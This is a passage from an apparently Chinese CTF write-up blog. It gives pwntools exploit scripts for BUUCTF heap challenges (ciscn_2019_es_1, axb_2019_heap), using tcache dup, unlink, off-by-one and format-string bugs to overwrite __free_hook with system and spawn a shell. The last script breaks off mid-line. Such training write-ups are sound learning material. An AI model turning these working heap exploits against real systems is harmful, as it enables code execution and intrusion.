function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Your choice: '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre></pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> content<span class=\"token operator\">=</span><span class=\"token string\">b'a'</span><span class=\"token operator\">*</span><span class=\"token number\">4</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input size: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input content: '</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input list index: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>    dbg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input list index: \\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre></pre></td></tr><tr><td data-num=\"38\"></td><td><pre></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>sys_p <span class=\"token operator\">=</span> e<span class=\"token punctuation\">.</span>plt<span class=\"token punctuation\">[</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">]</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"43\"></td><td><pre></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># get add: r0</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'Content is \\''</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre>addr <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\''</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"49\"></td><td><pre><span class=\"token keyword\">print</span><span class=\"token punctuation\">(</span><span class=\"token string\">'addr: %#x'</span><span class=\"token operator\">%</span>addr<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>dbg<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre><span class=\"token comment\"># 20 20 20 40</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>addr<span class=\"token operator\">+</span><span class=\"token number\">0x40</span><span class=\"token punctuation\">)</span><span class=\"token operator\">+</span>p64<span class=\"token punctuation\">(</span>sys_p<span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span> <span class=\"token comment\"># write in h0</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x38</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"54\"></td><td><pre></pre></td></tr><tr><td data-num=\"55\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"ciscn_2019_es_1\"><a class=\"markdownIt-Anchor\" href=\"#ciscn_2019_es_1\">#</a> ciscn_2019_es_1</h1>\n<p>** 考点：**heap, tcache dup, free_hook</p>\n<p>**libc 版本：**ibc6_2.27-3ubuntu1_amd64</p>\n<p>块管理块。释放只释放用户块。释放后地址不清空。</p>\n<p>分配超过 0x400 大小的块然后释放，再打印，泄露 libc 地址。</p>\n<p>tcache dup 对 free_hook 进行读写，将其修改为 system 的地址。最后释放含 <code>&quot;/bin/sh\\0&quot;</code>  字符串的块。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher3 <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'ciscn_2019_es_1'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">28322</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b *$rebase(0x1621)'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre></pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'choice:'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"20\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">,</span>  content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b's name'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>size<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"23\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'input name:\\n'</span><span class=\"token punctuation\">,</span> name<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'compary call:\\n'</span><span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">free</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">3</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"29\"></td><td><pre></pre></td></tr><tr><td data-num=\"30\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">dump</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"31\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"32\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'Please input the index:\\n'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"33\"></td><td><pre></pre></td></tr><tr><td data-num=\"34\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 0'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"35\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 1'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"36\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x18</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'/bin/sh\\0'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 2'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"37\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"38\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"39\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">0</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"40\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"41\"></td><td><pre>r0u <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"42\"></td><td><pre></pre></td></tr><tr><td data-num=\"43\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"44\"></td><td><pre>dump<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"45\"></td><td><pre>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'name:\\n'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"46\"></td><td><pre>ma_ <span class=\"token operator\">=</span> u64<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">.</span>recvuntil<span class=\"token punctuation\">(</span><span class=\"token string\">b'\\n'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">[</span><span class=\"token punctuation\">:</span><span class=\"token operator\">-</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">.</span>ljust<span class=\"token punctuation\">(</span><span class=\"token number\">8</span><span class=\"token punctuation\">,</span><span class=\"token string\">b'\\0'</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"47\"></td><td><pre>mh_a <span class=\"token operator\">=</span> ma_ <span class=\"token operator\">-</span> <span class=\"token number\">96</span> <span class=\"token operator\">-</span> <span class=\"token number\">0x10</span></pre></td></tr><tr><td data-num=\"48\"></td><td><pre></pre></td></tr><tr><td data-num=\"49\"></td><td><pre>obj <span class=\"token operator\">=</span> LibcSearcher<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">,</span> mh_a<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"50\"></td><td><pre>libcbase <span class=\"token operator\">=</span> mh_a <span class=\"token operator\">-</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__malloc_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"51\"></td><td><pre>fh_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'__free_hook'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"52\"></td><td><pre>sys_a <span class=\"token operator\">=</span> libcbase <span class=\"token operator\">+</span> obj<span class=\"token punctuation\">.</span>dump<span class=\"token punctuation\">(</span><span class=\"token string\">'system'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"53\"></td><td><pre></pre></td></tr><tr><td data-num=\"54\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x418</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'a'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'head 3'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"55\"></td><td><pre></pre></td></tr><tr><td data-num=\"56\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>fh_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h4'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"57\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'getshell!'</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h5'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"58\"></td><td><pre>mal<span class=\"token punctuation\">(</span><span class=\"token number\">0x28</span><span class=\"token punctuation\">,</span> p64<span class=\"token punctuation\">(</span>sys_a<span class=\"token punctuation\">)</span><span class=\"token punctuation\">,</span> <span class=\"token string\">b'h6'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"59\"></td><td><pre>free<span class=\"token punctuation\">(</span><span class=\"token number\">2</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"60\"></td><td><pre></pre></td></tr><tr><td data-num=\"61\"></td><td><pre>p<span class=\"token punctuation\">.</span>interactive<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr></table></figure><h1 id=\"axb_2019_heap\"><a class=\"markdownIt-Anchor\" href=\"#axb_2019_heap\">#</a> axb_2019_heap</h1>\n<p>** 考点：**fmtstr, unlink, off_by_one</p>\n<p>**libc 版本：**libc6_2.23</p>\n<p>该程序开启了全保护，一开始有个 printf 的格式化字符串漏洞。</p>\n<p>分配函数略显复杂。分配时，若 key 变量值不为 43，那么将不能分配大小小于 0x80，即属于 fastbin 范围的块。之后有个分配后地址合法性校验，分配得到的地址不能过于接近储存块地址的数组。</p>\n<p>含有编辑函数。释放函数清空了指针。</p>\n<p>对块进行读写的函数 <code>get_input</code>  存在 off by one 漏洞。当已输入字符数等于大于给定值 + 1 后才退出。</p>\n<p><img data-src=\"./image-20231118194147647.png\" alt=\"image-20231118194147647\"></p>\n<h2 id=\"利用\"><a class=\"markdownIt-Anchor\" href=\"#利用\">#</a> 利用</h2>\n<p>一开始的格式化字符串漏洞只能利用一次，因此只能利用其泄露地址。泄露代码段地址可以推测.bss 段地址，由此计算出 notelist 真实地址。泄露 libc 地址用于获取 system 函数地址。拿到数组地址后可以利用 unlink，由此实现任意地址读写，将 free_hook 填入 system 地址，后面的懂的都懂。</p>\n<blockquote>\n<p>若一开始格式化字符串使用的输入函数是 read，那么可以利用低字节覆盖，将 main 函数地址覆盖为 key 变量的地址，然后利用 % n 修改 key 为 43。但第三字节需要爆破。</p>\n<p>若没有 canary 保护，且 read 函数输入，则可以溢出覆盖返回地址低位，再次利用格式化字符串漏洞。</p>\n</blockquote>\n<p>这题有个很坑的点。分配函数内有个 check_pass 函数验证分配地址合法性。由于 unlink 后，p 和 p 储存的内容只有 0x18 的差距，必定无法通过验证，所以一开始我以为必定用不成 unlink。但是！都 unlink 任意地址读写了，为啥还会需要再去分配 fake chunk 之类的呢？而编辑函数内没有该检测，所以 unlink 利用没有收到任何影响。这次属于是被出题者骗到了。</p>\n<figure class=\"highlight python\"><figcaption data-lang=\"python\"></figcaption><table><tr><td data-num=\"1\"></td><td><pre><span class=\"token comment\">#!/usr/bin/python3</span></pre></td></tr><tr><td data-num=\"2\"></td><td><pre><span class=\"token keyword\">from</span> pwn <span class=\"token keyword\">import</span> <span class=\"token operator\">*</span></pre></td></tr><tr><td data-num=\"3\"></td><td><pre><span class=\"token keyword\">from</span> LibcSearcher <span class=\"token keyword\">import</span> LibcSearcher</pre></td></tr><tr><td data-num=\"4\"></td><td><pre>context<span class=\"token punctuation\">(</span>arch<span class=\"token operator\">=</span><span class=\"token string\">'amd64'</span><span class=\"token punctuation\">,</span> log_level<span class=\"token operator\">=</span><span class=\"token string\">'debug'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"5\"></td><td><pre></pre></td></tr><tr><td data-num=\"6\"></td><td><pre>filename <span class=\"token operator\">=</span> <span class=\"token string\">'axb_2019_heap'</span></pre></td></tr><tr><td data-num=\"7\"></td><td><pre>libcfile <span class=\"token operator\">=</span> <span class=\"token string\">'/home/walt/share/pwn/libc/libc6_2.23-0ubuntu10_amd64/libc/lib/x86_64-linux-gnu/libc-2.23.so'</span></pre></td></tr><tr><td data-num=\"8\"></td><td><pre>libc <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span>libcfile<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"9\"></td><td><pre></pre></td></tr><tr><td data-num=\"10\"></td><td><pre>mode <span class=\"token operator\">=</span> <span class=\"token builtin\">int</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">[</span><span class=\"token number\">1</span><span class=\"token punctuation\">]</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> <span class=\"token builtin\">len</span><span class=\"token punctuation\">(</span>sys<span class=\"token punctuation\">.</span>argv<span class=\"token punctuation\">)</span><span class=\"token operator\">></span><span class=\"token number\">1</span> <span class=\"token keyword\">else</span> <span class=\"token number\">0</span></pre></td></tr><tr><td data-num=\"11\"></td><td><pre>p <span class=\"token operator\">=</span> process<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> remote<span class=\"token punctuation\">(</span><span class=\"token string\">'node4.buuoj.cn'</span><span class=\"token punctuation\">,</span><span class=\"token number\">29478</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"12\"></td><td><pre>e <span class=\"token operator\">=</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token operator\">+</span><span class=\"token string\">'_pe'</span><span class=\"token punctuation\">)</span> <span class=\"token keyword\">if</span> mode <span class=\"token keyword\">else</span> ELF<span class=\"token punctuation\">(</span><span class=\"token string\">'./'</span><span class=\"token operator\">+</span>filename<span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"13\"></td><td><pre></pre></td></tr><tr><td data-num=\"14\"></td><td><pre><span class=\"token keyword\">if</span> mode<span class=\"token operator\">==</span><span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"15\"></td><td><pre>    gdb<span class=\"token punctuation\">.</span>attach<span class=\"token punctuation\">(</span>p<span class=\"token punctuation\">,</span> <span class=\"token string\">'b printf'</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"16\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"17\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">suspend</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"18\"></td><td><pre>    <span class=\"token keyword\">if</span> mode <span class=\"token operator\">==</span> <span class=\"token number\">2</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"19\"></td><td><pre>        pause<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"20\"></td><td><pre>    <span class=\"token keyword\">else</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"21\"></td><td><pre>        sleep<span class=\"token punctuation\">(</span><span class=\"token number\">0.1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"22\"></td><td><pre></pre></td></tr><tr><td data-num=\"23\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">choose</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"24\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'>> '</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>x<span class=\"token punctuation\">)</span><span class=\"token punctuation\">.</span>encode<span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"25\"></td><td><pre>    </pre></td></tr><tr><td data-num=\"26\"></td><td><pre><span class=\"token keyword\">def</span> <span class=\"token function\">mal</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">,</span> size<span class=\"token punctuation\">,</span> content<span class=\"token punctuation\">)</span><span class=\"token punctuation\">:</span></pre></td></tr><tr><td data-num=\"27\"></td><td><pre>    choose<span class=\"token punctuation\">(</span><span class=\"token number\">1</span><span class=\"token punctuation\">)</span></pre></td></tr><tr><td data-num=\"28\"></td><td><pre>    p<span class=\"token punctuation\">.</span>sendlineafter<span class=\"token punctuation\">(</span><span class=\"token string\">b'(0-10):'</span><span class=\"token punctuation\">,</span> <span class=\"token builtin\">str</span><span class=\"token punctuation\">(</span>index<span class=\"token punctuation\">)</span><span 